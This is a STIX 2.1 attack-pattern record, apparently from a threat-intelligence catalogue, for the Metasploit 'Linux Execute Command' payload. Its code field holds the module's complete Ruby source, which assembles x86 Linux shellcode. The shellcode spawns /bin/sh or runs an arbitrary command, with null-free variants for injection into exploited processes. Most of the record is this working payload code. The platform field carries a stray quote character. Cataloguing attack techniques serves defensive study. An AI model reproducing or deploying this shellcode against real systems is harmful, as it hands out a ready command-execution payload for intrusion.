{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b2d68c09-2f0a-4b67-82f3-31cc3aea1b00",
    "created": "2024-08-14T16:33:19.43588Z",
    "modified": "2024-08-14T16:33:19.435884Z",
    "name": "Linux Execute Command",
    "description": "Execute an arbitrary command or just a /bin/sh shell",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/linux/x86/exec.rb",
            "external_id": "exec.rb"
        },
        {
            "source_name": "References=>URL",
            "external_id": "https://github.com/geyslan/SLAE/blob/master/4th.assignment/tiny_execve_sh.asm"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/geyslan/SLAE/blob/master/improvements/x86_execve_dyn.asm"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n###\n#\n# Exec\n# ----\n#\n# Executes an arbitrary command.\n#\n###\nmodule MetasploitModule\n\n  CachedSize = 43\n\n  include Msf::Payload::Single\n  include Msf::Payload::Linux\n\n  def initialize(info = {})\n    super(merge_info(info,\n      'Name'          => 'Linux Execute Command',\n      'Description'   => 'Execute an arbitrary command or just a /bin/sh shell',\n      'Author'        => ['vlad902',\n                          'Geyslan G. Bem <geyslan[at]gmail.com>'],\n      'License'       => MSF_LICENSE,\n      'References'    => [ ['URL', 'https://github.com/geyslan/SLAE/blob/master/4th.assignment/tiny_execve_sh.asm'],\n                           ['URL', 'https://github.com/geyslan/SLAE/blob/master/improvements/x86_execve_dyn.asm'] ],\n      'Platform'      => 'linux',\n      'Arch'          => ARCH_X86\n    ))\n\n    # Register exec options\n    register_options(\n      [\n        OptString.new('CMD',  [ false,  \"The command string to execute\" ]),\n      ])\n    register_advanced_options(\n      [\n        OptBool.new('NullFreeVersion', [ true, \"Null-free shellcode version\", false ])\n      ])\n  end\n\n  def generate(opts={})\n    cmd             = datastore['CMD'] || ''\n    nullfreeversion = datastore['NullFreeVersion']\n    if cmd.empty?\n      #\n      # Builds the exec payload which executes a /bin/sh shell.\n      # execve(\"/bin/sh\", NULL, NULL)\n      #\n      if nullfreeversion\n        # 21 bytes (null-free)\n        payload = <<-EOS\n            xor ecx, ecx     ; ecx = NULL\n            mul ecx          ; eax and edx = NULL\n            mov al, 0xb      ; execve syscall\n            push ecx         ; string '\\0'\n            push 0x68732f2f  ; \"//sh\"\n            push 0x6e69622f  ; \"/bin\"\n            mov ebx, esp     ; pointer to \"/bin//sh\\0\" cmd\n            int 0x80         ; bingo\n        EOS\n      else\n        # 20 bytes (not null-free)\n        payload = <<-EOS\n            xor ecx, ecx     ; ecx = NULL\n            mul ecx          ; eax and edx = NULL\n            mov al, 0xb      ; execve syscall\n            push 0x0068732f  ; \"/sh\\0\"\n            push 0x6e69622f  ; \"/bin\"\n            mov ebx, esp     ; pointer to \"/bin/sh\\0\" cmd\n            int 0x80         ; bingo\n        EOS\n      end\n    else\n      #\n      # Dynamically builds the exec payload based on the user's options.\n      # execve(\"/bin/sh\", [\"/bin/sh\", \"-c\", \"CMD\"], NULL)\n      #\n      pushw_c_opt = \"dd 0x632d6866\" # pushw 0x632d (metasm doesn't support pushw)\n      if nullfreeversion\n        if cmd.length > 0xffff\n          raise RangeError, \"CMD length has to be smaller than %d\" % 0xffff, caller()\n        end\n        if cmd.length <= 0xff # 255\n          breg = \"bl\"\n        else\n          breg = \"bx\"\n          if (cmd.length & 0xff) == 0 # let's avoid zeroed bytes\n            cmd += \" \"\n          end\n        end\n        mov_cmd_len_to_breg = \"mov #{breg}, #{cmd.length}\"\n        # 47/49 bytes without cmd (null-free)\n        payload  = <<-EOS\n            xor ebx, ebx\n            mul ebx\n            mov al, 0xb\n            push edx\n            #{pushw_c_opt}         ; \"-c\"\n            mov edi, esp\n            jmp tocall             ; jmp/call/pop cmd address\n          afterjmp:\n            pop esi                ; pop cmd address into esi\n            #{mov_cmd_len_to_breg} ; mov (byte/word) (bl/bx), cmd.length\n            mov [esi+ebx], dl      ; NUL '\\0' terminate cmd\n            push edx\n            push 0x68732f2f        ; \"//sh\"\n            push 0x6e69622f        ; \"/bin\"\n            mov ebx, esp\n            push edx\n            push esi\n            push edi\n            push ebx\n            mov ecx, esp\n            int 0x80\n          tocall:\n            call afterjmp          ; call/pop cmd address\n            db \"#{cmd}\"\n        EOS\n      else\n        # 36 bytes without cmd (not null-free)\n        payload = <<-EOS\n            push 0xb\n            pop eax\n            cdq\n            push edx\n            #{pushw_c_opt}   ; \"-c\"\n            mov edi, esp\n            push 0x0068732f  ; \"/sh\\0\"\n            push 0x6e69622f  ; \"/bin\"\n            mov ebx, esp\n            push edx\n            call continue\n            db \"#{cmd}\", 0x00\n          continue:\n            push edi\n            push ebx\n            mov ecx, esp\n            int 0x80\n        EOS\n      end\n    end\n    Metasm::Shellcode.assemble(Metasm::Ia32.new, payload).encode_string\n  end\nend\n",
    "x_mitre_platforms": [
        "linux'"
    ]
}